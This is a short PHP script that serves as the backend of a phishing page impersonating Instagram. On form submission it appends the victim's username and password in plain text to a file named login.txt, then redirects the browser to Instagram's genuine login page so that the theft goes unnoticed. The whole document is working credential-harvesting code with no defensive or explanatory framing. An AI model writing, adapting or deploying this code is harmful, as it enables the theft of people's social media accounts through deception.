<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $data = "Username: $user\nPassword: $pass\n\n";
    file_put_contents("login.txt", $data, FILE_APPEND);
    header("Location: https://www.instagram.com/accounts/login/?hl=en");
    exit();
}
?>
